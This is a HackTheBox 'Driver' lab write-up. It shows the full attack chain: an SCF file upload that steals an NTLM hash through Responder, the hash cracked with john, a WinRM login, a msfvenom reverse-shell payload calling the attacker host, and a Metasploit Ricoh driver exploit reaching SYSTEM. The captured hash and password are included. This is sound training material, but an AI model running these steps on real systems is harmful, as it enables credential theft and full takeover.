### Driver HTB

### Difficulty = Easy

### IP Address = 10.10.11.106

Nmap Scan:
  
```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ nmap -sCV -A 10.10.11.106 -p80,139,445,5985 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-23 05:14 WAT
Nmap scan report for 10.10.11.106
Host is up (0.26s latency).

PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
139/tcp  filtered netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-01-23T11:15:05
|_  start_date: 2023-01-23T11:04:57
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.27 seconds
```

Checking if smb allows anonymous listing and connecting of shares

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ smbclient -L 10.10.11.106        
Password for [WORKGROUP\mark]:
session setup failed: NT_STATUS_ACCESS_DENIED
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ smbclient -L 10.10.11.106 -U Administrator
Password for [WORKGROUP\Administrator]:
session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ 
```

Time to enumerate the web service

It requires password to login 
![image](https://user-images.githubusercontent.com/113513376/213965159-5ee9dacb-d321-4c14-b11e-c2f28b6599fc.png)

Trying admin:admin works
![image](https://user-images.githubusercontent.com/113513376/213965212-8e84ab97-4b03-4b13-8b4f-232fb72415a3.png)

Time to check out the web functions

There's nothing of interest there except `/fw_up.php`

It offers upload of a file
![image](https://user-images.githubusercontent.com/113513376/213965369-19462a01-0c6d-4672-993c-018138a2a1c4.png)

And from reading it 

It says after you upload a file the admin will view the file 

Meaning even if we try uploading a .php file we won't be able to execute it cause aren't going to have access to the file

But there's a way for us to take advantage of this

And this is by performing a scf attack

What that does is that it will steal the ntlm hash of the user who view's the file and sends it to us

Less talking more action xD

I'll be using ntlm_theft tool to create the malicious .scf file https://github.com/Greenwolf/ntlm_theft

So i'll create a .scf file using the tool

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ python3 ~/Desktop/Tools/ntlm_theft/ntlm_theft.py 
usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
ntlm_theft.py: error: the following arguments are required: -g/--generate, -s/--server, -f/--filename
 ```
 
 Now lets generate the file
 
 ```
                                                                                                                                                                                                                    
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ python3 ~/Desktop/Tools/ntlm_theft/ntlm_theft.py -g scf --server 10.10.16.7 --filename printer 
Created: printer/printer.scf (BROWSE TO FOLDER)
Generation Complete.
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ ls
nmapscan  printer
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ cd printer               
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/HTB/Driver/printer]
└─$ ls
printer.scf
                                                                                                                                                                                                                  
```

Now that we've created the file we need to set up responder so that it will capture the hash when the attack is being performed

```
                                                                                                                                                                                                            [19/19]
┌──(mark__haxor)-[~/_/B2B/HTB/Driver/printer]                                                                                                                                                                      
└─$ sudo responder -I tun0                                                                                                                                                                                         
                                         __                                                                                                                                                                        
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                                           
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                                           
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                                                             
                   |__|                                                                                                                                                                                            
                                                                                                                                                                                                                   
           NBT-NS, LLMNR & MDNS Responder 3.1.3.0                                                                                                                                                                  
                                                                                                                                                                                                                   
  To support this project:                                                                                                                                                                                         
  Patreon -> https://www.patreon.com/PythonResponder                                                                                                                                                               
  Paypal  -> https://paypal.me/PythonResponder                                                                                                                                                                     
                                                                                                                                                                                                                   
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                                                                
  To kill this script hit CTRL-C                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Poisoners:                                                                                                                                                                                                     
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]
[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.7]
    Responder IPv6             [dead:beef:4::1005]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-R48PI0LKBVR]
    Responder Domain Name      [OL2C.LOCAL]
    Responder DCE-RPC Port     [46156]

[+] Listening for events...

```

While its listening for events i'll upload the file in hopes that the admin really would view it
![image](https://user-images.githubusercontent.com/113513376/213966090-64b5514d-0d7a-4ca4-a599-3c66700728f6.png)

After uploading it immediately we get a event back from responder listener

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:c0f37edf918a81d6:C4675B9B60020148A895455966E727BE:010100000000000000F2F680EB2ED9012BFA167BF646C14800000000020008004F004C003200430001001E00570049004E002D005200340038005000490030004C004B0042005600520004003400570049004E002D005200340038005000490030004C004B004200560052002E004F004C00320043002E004C004F00430041004C00030014004F004C00320043002E004C004F00430041004C00050014004F004C00320043002E004C004F00430041004C000700080000F2F680EB2ED901060004000200000008003000300000000000000000000000002000001214D93D03D45105283E261AB2D0190BB043AF7EE73292FDF3E15A83A5FE73F50A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003700000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
```

Now that we have the hash lets brute force the password

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ nano hash                                                   
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ john -w=/home/mark/Documents/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)     
1g 0:00:00:00 DONE (2023-01-23 05:31) 14.28g/s 453485p/s 453485c/s 453485C/s !!!!!!..225566
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
 ```
 
 Now that we have a valid credential lets connect to winrm using evil-winrm tool
 
 ```
                                                                                                                                                                                                                    
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Driver]
└─$ evil-winrm -u tony -p liltony -i 10.10.11.106

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> 

```

Now lets escalate privilege to admin

I’ll generate a simple executable with msfvenom then transfer it to the target 

So that i can use metasploit exploit suggester

```
msf6 > msfvenom -p windows/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=tun0 LPORT=4444
[*] exec: msfvenom -p windows/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=tun0 LPORT=4444

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
msf6 > 
```

And upload it with Evil-WinRM:

```
*Evil-WinRM* PS C:\Users\tony\Documents> upload /home/mark/Desktop/B2B/HTB/Driver/shell.exe
Info: Uploading /home/mark/Desktop/B2B/HTB/Driver/shell.exe to C:\Users\tony\Documents\shell.exe

                                                             
Data: 98400 bytes of 98400 bytes copied

Info: Upload successful!

```

In Metasploit, I’ll switch to exploit/multi/handler

Which is the exploit that tells MSF to listen on a port for a connection from a payload and handle it. 

I’ll set the payload and LHOST, and run it

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
```

Now i'll run the generated shell.exe

```
*Evil-WinRM* PS C:\Users\tony\Documents> .\shell.exe
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Back on the listener we get a connection

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Sending stage (175686 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.16.7:4444 -> 10.10.11.106:49433) at 2023-01-23 06:08:50 +0100

meterpreter > getuid
Server username: DRIVER\tony
meterpreter > 

```

Now i'll background the session and use msf exploit suggester

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > 
```

Then on running it

```
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.11.106 - Collecting local exploits for x86/windows...
[*] 10.10.11.106 - 167 exploit checks are being tried...
[+] 10.10.11.106 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[*] Done
```

If i check the system version i see that its x64 but the exploit suggester is running checks for x86 

Thats because the payload we used for the shell.exe wasn't specified to work for x64 or x86

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > systeminfo
[-] Unknown command: systeminfo
meterpreter > sysinfo
Computer        : DRIVER
OS              : Windows 10 (10.0 Build 10240).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > 
```

Now we can either migrate to a process which will then grant migrate us to x64 

Or we can create the reverse shell binary again but this time specify `windows/x64/meterpreter/reverse_tcp` 

Doing that would be stressfull so lets just migrate to a process

```
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User         Path
 ---   ----  ----                     ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 264   4     smss.exe
 340   332   csrss.exe
 344   4456  shell.exe                x86   0        DRIVER\tony  C:\Users\tony\Documents\shell.exe
 448   332   wininit.exe
 456   440   csrss.exe
 516   440   winlogon.exe
 568   448   services.exe
 576   448   lsass.exe
 592   656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 656   568   svchost.exe
 708   568   svchost.exe
 724   976   WUDFHost.exe
 752   656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 836   568   svchost.exe
 844   516   dwm.exe
 860   568   svchost.exe
 868   568   svchost.exe
 976   568   svchost.exe
 984   568   svchost.exe
 1072  568   svchost.exe
 1156  568   spoolsv.exe
 1280  568   svchost.exe
 1560  568   svchost.exe
 1596  568   svchost.exe
 1708  568   svchost.exe
 1784  568   VGAuthService.exe
 1796  568   vm3dservice.exe
 1896  1796  vm3dservice.exe
 1924  568   vmtoolsd.exe
 1936  568   svchost.exe
 2148  836   sihost.exe               x64   1        DRIVER\tony  C:\Windows\System32\sihost.exe
 2212  568   dllhost.exe
 2264  836   taskhostw.exe            x64   1        DRIVER\tony  C:\Windows\System32\taskhostw.exe
 2380  656   WmiPrvSE.exe
 2432  836   cmd.exe                  x64   1        DRIVER\tony  C:\Windows\System32\cmd.exe
 2500  568   msdtc.exe
 2608  2432  conhost.exe              x64   1        DRIVER\tony  C:\Windows\System32\conhost.exe
 2652  568   svchost.exe
 2712  568   sedsvc.exe
 2748  568   SearchIndexer.exe
 3092  2152  explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3148  656   RuntimeBroker.exe        x64   1        DRIVER\tony  C:\Windows\System32\RuntimeBroker.exe
 3180  656   wsmprovhost.exe          x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 3200  344   cmd.exe                  x86   0        DRIVER\tony  C:\Windows\SysWOW64\cmd.exe
 3416  656   ShellExperienceHost.exe  x64   1        DRIVER\tony  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 3536  656   SearchUI.exe             x64   1        DRIVER\tony  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3656  656   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 4112  568   svchost.exe
 4252  2432  PING.EXE                 x64   1        DRIVER\tony  C:\Windows\System32\PING.EXE
 4288  568   svchost.exe              x64   1        DRIVER\tony  C:\Windows\System32\svchost.exe
 4456  656   wsmprovhost.exe          x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 4792  3200  conhost.exe              x64   0        DRIVER\tony  C:\Windows\System32\conhost.exe
 4944  3092  vmtoolsd.exe             x64   1        DRIVER\tony  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 5036  3092  OneDrive.exe             x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe

```

Now we can migrate to any of the process that its Arch is x64

In this case i'll be migrating to vmtoolsd.exe process

```
meterpreter > migrate 4944
[*] Migrating from 344 to 4944...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : DRIVER
OS              : Windows 10 (10.0 Build 10240).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```

Now i'll background the session again and run the exploit suggester

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.11.106 - Collecting local exploits for x64/windows...
[*] 10.10.11.106 - 167 exploit checks are being tried...
[+] 10.10.11.106 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 10.10.11.106 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.11.106 - exploit/windows/local/ricoh_driver_privesc: The target appears to be vulnerable. Ricoh driver directory has full permissions
[+] 10.10.11.106 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.11.106 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ricoh_driver_privesc                     Yes                      The target appears to be vulnerable. Ricoh driver directory has full permissions
 12  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
```

Well it says there's about 12 exploit hahaha

Anyways am not sure they will all work

But exploit 11 will work 

So i'll use it to get admin xD

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ricoh_driver_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ricoh_driver_privesc) > options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/ricoh_driver_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ricoh_driver_privesc) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ricoh_driver_privesc) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Exploit completed, but no session was created.
```

It failed cause the payload isn't the same as the architecture driver

So i'll change the payload to x64 meterpreter then run it again

```
msf6 exploit(windows/local/ricoh_driver_privesc) > exploit

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer xImsMhzSE...
[*] Deleting printer xImsMhzSE
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ricoh_driver_privesc) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  DRIVER\tony @ DRIVER          10.10.16.7:4444 -> 10.10.11.106:49433 (10.10.11.106)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DRIVER  10.10.16.7:4444 -> 10.10.11.106:49434 (10.10.11.106)

msf6 exploit(windows/local/ricoh_driver_privesc) > 
```

Now i'll switch to the nt/authority shell

```
msf6 exploit(windows/local/ricoh_driver_privesc) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>










